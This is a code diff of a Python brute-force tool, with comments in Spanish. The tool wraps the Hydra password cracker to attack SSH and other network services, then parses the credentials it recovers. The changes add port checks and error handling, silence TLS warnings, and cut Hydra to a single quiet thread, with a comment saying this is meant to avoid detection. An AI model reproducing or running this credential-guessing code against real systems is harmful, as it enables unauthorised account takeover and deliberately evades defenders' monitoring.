@@ -6,9 +6,12 @@ import subprocess
 import tempfile
 import os
 import json
-import itertools
-import time  # Agregar este import si no está
+import socket
+import warnings
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
+warnings.simplefilter('ignore', InsecureRequestWarning)
 
 def create_wordlist_files(username_list, password_list):
     """Create temporary files for username and password lists."""
@@ -30,8 +33,6 @@ def create_wordlist_files(username_list, password_list):
 def get_login_page_size(target_url):
     """Get the size of the main login page (NOT a failure test)."""
     try:
-        import requests
-        
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
@@ -441,142 +442,193 @@ def attack_hydra_service(target_ip, target_port, service, username_list, passwor
         print(f"      🔧 Service: {service}")
         print(f"      📝 Testing {len(username_list)} × {len(password_list)} = {len(username_list) * len(password_list)} combinations")
         
-        # Crear archivos de wordlist para Hydra
+        # PASO 1: Verificar conectividad básica del puerto
+        if not check_port_connectivity(target_ip, target_port, timeout=5):
+            print(f"      ❌ Port {target_port} not accessible on {target_ip}")
+            print(f"      💡 Host may be down, firewalled, or service not running")
+            return False, []
+        
+        # PASO 2: Verificar Hydra installation (UNA SOLA VEZ)
+        try:
+            which_result = subprocess.run(["which", "hydra"], capture_output=True, text=True, timeout=5)
+            if which_result.returncode != 0:
+                print(f"      ❌ Hydra not found in PATH")
+                print(f"      💡 Install with: sudo apt install hydra")
+                return False, []
+            
+            print(f"      ✅ Hydra found at: {which_result.stdout.strip()}")
+            
+        except FileNotFoundError:
+            print(f"      ❌ 'which' command not available")
+            return False, []
+        except Exception as e:
+            print(f"      ⚠️  Error checking Hydra: {str(e)[:50]}")
+            return False, []
+        
+        # PASO 3: Crear archivos de wordlist
         username_file, password_file = create_wordlist_files(username_list, password_list)
         
-        # Construir comando Hydra
+        # PASO 4: Comando Hydra optimizado
         command = [
             "hydra",
             "-L", username_file,
             "-P", password_file,
-            "-t", "4",  # 4 threads
-            "-w", "3",  # 3 second timeout
+            "-t", "1",  # Single thread para evitar detección
+            "-w", "10", # 10 segundos timeout
             "-f",       # Stop on first success
-            "-v",       # Verbose
-            target_ip,
+            "-q",       # Quiet mode
             "-s", str(target_port),
+            target_ip,
             service
         ]
         
-        # Mostrar comando completo
-        cmd_display = " ".join(command)
+        cmd_display = f"hydra -L users.txt -P pass.txt -t 1 -w 10 -f -q -s {target_port} {target_ip} {service}"
         print(f"      💻 Hydra Command: {cmd_display}")
         
-        # Verificar si Hydra está disponible
-        try:
-            test_result = subprocess.run(["hydra", "-h"], capture_output=True, text=True, timeout=5)
-            if test_result.returncode != 0:
-                print(f"      ❌ Hydra not working properly")
-                return False, []
-        except FileNotFoundError:
-            print(f"      ❌ Hydra not found in PATH")
-            print(f"      💡 Install with: sudo apt install hydra")
-            return False, []
-        
-        # Ejecutar Hydra
+        # PASO 5: Ejecutar Hydra
         print(f"      🚀 Running Hydra attack...")
-        result = subprocess.run(command, capture_output=True, text=True, timeout=180)  # 3 minutos timeout
+        result = subprocess.run(command, capture_output=True, text=True, timeout=180)
         
-        # Analizar resultados de Hydra
+        print(f"      📊 Exit code: {result.returncode}")
+        
+        # PASO 6: Analizar errores específicos PRIMERO
+        if result.stderr:
+            stderr_lower = result.stderr.lower()
+            
+            # SSH key-only authentication
+            if "does not support password authentication" in stderr_lower or "method reply 4" in stderr_lower:
+                print(f"      🔐 SSH Key-Only Authentication detected")
+                print(f"      💡 This server only accepts SSH key authentication (no passwords)")
+                print(f"      ❌ Password brute force not possible on this target")
+                return False, []
+            
+            # Connection errors
+            elif any(error in stderr_lower for error in ["could not connect", "connection refused", "Connection timed out", "timeout"]):
+                print(f"      🔌 Connection failed - service may be down or filtered")
+                return False, []
+            
+            # Network errors
+            elif any(error in stderr_lower for error in ["network unreachable", "could not resolve"]):
+                print(f"      🌐 Network error - host may be unreachable")
+                return False, []
+            
+            # Permission/access errors
+            elif "permission denied" in stderr_lower:
+                print(f"      🛡️  Permission denied - service may be restricted")
+                return False, []
+            
+            # Service not supported
+            elif any(error in stderr_lower for error in ["unsupported service", "unknown service"]):
+                print(f"      🚫 Service {service} not supported by Hydra")
+                return False, []
+            
+            # Mostrar error específico si no coincide con ningún patrón conocido
+            else:
+                stderr_preview = result.stderr.strip()[:150]
+                print(f"      🔍 Error: {stderr_preview}")
+        
+        # PASO 7: Analizar ÉXITO - LÓGICA CORREGIDA
         found_credentials = []
         success_found = False
         
-        # Buscar patrones de éxito en la salida
-        output_lines = result.stdout.split('\n')
+        # Analizar tanto stdout como stderr para encontrar credenciales
+        all_output = (result.stdout + "\n" + (result.stderr or "")).lower()
+        output_lines = (result.stdout + "\n" + (result.stderr or "")).split('\n')
+        
         for line in output_lines:
             line = line.strip()
-            
-            # Patrones de éxito comunes en Hydra
-            if "login:" in line.lower() and "password:" in line.lower():
-                # Extraer credenciales del formato: [PORT][SERVICE] host: IP   login: USER   password: PASS
-                try:
-                    if "login:" in line and "password:" in line:
-                        # Buscar login: y password: en la línea
-                        login_start = line.find("login:") + 6
-                        login_end = line.find("password:") - 3
-                        password_start = line.find("password:") + 9
+            if not line:
+                continue
+                
+            # PATRONES DE ÉXITO REALES - Solo líneas que contienen credenciales válidas
+            if "login:" in line and "password:" in line:
+                # Verificar que NO contenga "0 valid password" o "0 password found"
+                if "0 valid password" not in line.lower() and "0 password found" not in line.lower():
+                    try:
+                        # Formato típico: [22][ssh] host: IP   login: user   password: pass
+                        login_match = line.find("login:")
+                        password_match = line.find("password:")
                         
-                        if login_start > 5 and password_start > 8:
-                            username = line[login_start:login_end].strip()
-                            password = line[password_start:].strip()
+                        if login_match != -1 and password_match != -1:
+                            login_part = line[login_match + 6:password_match].strip()
+                            password_part = line[password_match + 9:].strip()
                             
-                            credentials = f"{username}:{password}"
-                            found_credentials.append(credentials)
-                            success_found = True
-                            
-                            print(f"      🎉 SUCCESS: {credentials}")
-                except:
-                    # Si falla el parsing, mostrar la línea completa
-                    print(f"      🎉 SUCCESS: {line}")
-                    found_credentials.append("success:found")
-                    success_found = True
-            
-            # Otros patrones de éxito
-            elif "valid password found" in line.lower():
-                success_found = True
-                print(f"      🎉 SUCCESS: Valid credentials found")
-                if not found_credentials:
-                    found_credentials.append("valid:credentials")
+                            # Verificar que no estén vacíos
+                            if login_part and password_part:
+                                credentials = f"{login_part}:{password_part}"
+                                found_credentials.append(credentials)
+                                success_found = True
+                                print(f"      🎉 SUCCESS: {credentials}")
+                    except Exception:
+                        pass
         
-        # Verificar códigos de salida de Hydra
-        if result.returncode == 0 and not success_found:
-            # Hydra terminó correctamente pero buscar en stderr también
-            if "valid password found" in result.stderr.lower():
-                success_found = True
-                print(f"      🎉 SUCCESS: Valid credentials found (stderr)")
-                found_credentials.append("valid:credentials")
+        # VERIFICAR PATRONES DE NO-ÉXITO
+        if any(pattern in all_output for pattern in [
+            "0 valid password found",
+            "0 password found", 
+            "0 of ",
+            "no login/password found",
+            "0 valid passwords found"
+        ]):
+            print(f"      ❌ No valid credentials found")
+            return False, []
         
-        if success_found:
+        # VERIFICAR CÓDIGOS DE SALIDA
+        if result.returncode == 0 and success_found:
             print(f"      ✅ Found {len(found_credentials)} valid credential(s)")
             return True, found_credentials
-        else:
+        elif result.returncode == 0 and not success_found:
+            print(f"      ❌ Attack completed but no valid credentials found")
+            return False, []
+        elif result.returncode == 1:
             print(f"      ❌ No valid credentials found")
-            
-            # Debug para errores comunes
-            if result.returncode != 0:
-                if "could not connect" in result.stderr.lower():
-                    print(f"      ⚠️  Connection failed to {service} service")
-                elif "unsupported service" in result.stderr.lower():
-                    print(f"      ⚠️  Service {service} not supported by Hydra")
-                elif result.stderr.strip():
-                    error_msg = result.stderr.strip()[:80]
-                    print(f"      ⚠️  Hydra error: {error_msg}")
-            
+            return False, []
+        elif result.returncode == 2:
+            print(f"      ❌ Connection/service error")
+            return False, []
+        elif result.returncode == 255:
+            print(f"      ❌ General Hydra error")
+            return False, []
+        else:
+            print(f"      ❌ Unknown error (exit code {result.returncode})")
             return False, []
             
     except subprocess.TimeoutExpired:
-        print(f"      ⏰ Hydra attack timed out")
+        print(f"      ⏰ Hydra attack timed out (3 minutes)")
         return False, []
     except Exception as e:
-        print(f"      ❌ Unexpected error: {str(e)[:50]}")
+        print(f"      ❌ Unexpected error: {str(e)}")
         return False, []
     finally:
         # Cleanup
         try:
-            if 'username_file' in locals():
+            if 'username_file' in locals() and os.path.exists(username_file):
                 os.unlink(username_file)
-            if 'password_file' in locals():
+            if 'password_file' in locals() and os.path.exists(password_file):
                 os.unlink(password_file)
         except:
             pass
 
-
-# Mantener funciones de compatibilidad para otros servicios (no web forms)
-def run_bruteforce(target, username_list, password_list, service):
-    """Fallback to hydra for non-web services."""
-    print(f"  ⚠️  Non-web service detected: {service}")
-    print(f"  💡 FFUF is only for web forms, skipping...")
-    return False
-
-
 def check_port_connectivity(host, port, timeout=5):
     """Check if a port is open and accessible."""
     try:
-        import socket
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(timeout)
         result = sock.connect_ex((host, int(port)))
         sock.close()
-        return result == 0
-    except:
+        
+        if result == 0:
+            print(f"      ✅ Port {port} is accessible")
+            return True
+        else:
+            print(f"      ❌ Port {port} not accessible (connection failed)")
+            return False
+    except socket.gaierror as e:
+        print(f"      ❌ DNS resolution failed: {e}")
+        return False
+    except socket.timeout:
+        print(f"      ❌ Connection timeout")
+        return False
+    except Exception as e:
+        print(f"      ❌ Connection error: {e}")
         return False
